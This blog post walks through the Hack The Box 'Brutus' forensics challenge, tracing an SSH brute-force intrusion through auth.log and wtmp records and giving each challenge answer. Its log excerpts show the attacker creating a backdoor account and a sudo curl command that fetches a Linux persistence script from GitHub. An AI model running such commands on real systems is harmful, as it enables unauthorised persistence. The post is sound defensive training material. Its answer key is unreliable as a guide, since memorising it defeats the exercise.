---
slug: htb-sherlock-brutus
title: 'HTB Sherlock: Brutus'
authors: [cielo]
date: 2025-09-16
tags: [security, hack-the-box, tutorial, dfir]
---

[Hack The Box](https://www.hackthebox.com/) is an online cybersecurity training platform that allows individuals to test and advance their skills in penetration testing, digital forensics, and incident response. The "Sherlocks" are a series of defensive challenges focused on digital forensics and incident response (DFIR).

This post covers the "Brutus" Sherlock - investigating a brute-force attack against a Confluence server's SSH service. I'll walk through analyzing logs to trace the attacker's path from initial access to privilege escalation and persistence.

<!--truncate-->

## Getting Started

After downloading and unzipping `Brutus.zip`, there are three files:
*   `auth.log`: A log file from Unix-like systems that records user logins, authentication attempts, and other security-related events.
*   `wtmp`: A binary file that maintains a history of user logins and logouts.
*   `utmp.py`: A Python script to parse the binary `wtmp` file into a human-readable format.

## The Investigation

### T1: Attacker's IP Address
> Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

**Answer:** `65.2.161.68`

Looking through `auth.log`, there's a massive flood of failed login attempts from the same IP address. Pretty clear brute-force pattern here:

```bash
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436
... (many more attempts)
```

### T2: Compromised Username
> The bruteforce attempts were successful and the attacker gained access to an account on the server. What is the username of the account?

**Answer:** `root`

After all those failed attempts, the logs finally show a successful password acceptance for the `root` user. That's never good to see...

```bash
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

### T3: Manual Login Timestamp (UTC)
> Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

**Answer:** `2024-03-06 06:32:45 UTC`

To find the actual login time, I needed to analyze the `wtmp` file using the provided `utmp.py` script. Running `python3 utmp.py wtmp > wtmp.txt` gives a readable version with this entry:

```text
"USER"	"2549"	"pts/1"	"ts/1"	"root"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 14:32:45"	"387923"	"65.2.161.68"
```

The timestamp shows `14:32:45`, but there's a timezone catch here. The `auth.log` shows authentication at `06:32:44` UTC, while the `wtmp` parser is showing local time (probably UTC+8 based on the 8-hour difference). Converting back to UTC gives us the login time as `2024-03-06 06:32:45`.

### T4: Session Number
> SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

**Answer:** `37`

There were actually two successful `root` logins from the attacker's IP - Session 34 and Session 37. But Session 34 was super brief:

```bash
# Session 34: Quick automated login/logout
Mar  6 06:31:40 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 sshd[2411]: pam_unix(sshd:session): session closed for user root
Mar  6 06:31:40 systemd-logind[411]: Removed session 34.

# Session 37: The real interactive session
Mar  6 06:32:44 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 systemd-logind[411]: New session 37 of user root.
```

Session 34 looks like a brute-force tool just checking if credentials work, then immediately disconnecting. Session 37 is where the actual human activity happened.

### T5: Persistence - New User
> The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

**Answer:** `cyberjunkie`

Classic persistence move - create a backdoor user account. The `auth.log` shows the user creation:

```bash
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
```

### T6: MITRE ATT&CK ID
> What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

**Answer:** `T1136.001`

This maps to MITRE ATT&CK technique T1136: Create Account, specifically the sub-technique T1136.001: Local Account. Pretty textbook persistence technique.

### T7: Session End Time
> What time did the attacker's first SSH session end according to auth.log?

**Answer:** `06:37:24` on March 6th.

Looking for when session 37 ended:

```bash
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

### T8: Sudo Command for Privilege Escalation
> The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

After setting up the `cyberjunkie` user with sudo privileges, the attacker came back and used it to download what looks like a privilege escalation script:

```bash
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The script name "linper.sh" (probably "Linux Persistence") from montysecurity's repo suggests this is for maintaining access and escalating privileges further. Not good news for the compromised server.

## Reflections

This Sherlock was a good exercise in log analysis and understanding attacker behavior patterns. The most tricky part for me was definitely the Session 34 vs Session 37 confusion - I initially thought Session 34 was the answer since it was the first successful login I spotted in the logs.

But looking deeper at the timing and behavior patterns made it clear that Session 34 was just an automated tool verification (login and immediate logout in the same second), while Session 37 was the actual human interactive session where all the malicious activity happened. This is a great reminder that brute-force tools often do quick credential validation before the attacker manually logs in.

The timezone issue with the wtmp parsing also caught me off guard initially. It's easy to forget that different log sources might be in different timezones or that parsing scripts can introduce timezone conversions. Always good to cross-reference timestamps across different artifacts.

Overall, this scenario does a nice job of showing the full attack chain: 

:::tip Complete Attack Chain
a. 🔓 **Initial access** - brute force attack

b. ⚡ **Privilege escalation** - gained root access

c. 👤 **Persistence** - backdoor user creation

d. 🛠️ **Tool deployment** - downloading additional tools
:::
 
Pretty textbook attacker playbook, and the logs tell the story clearly once you know what to look for.
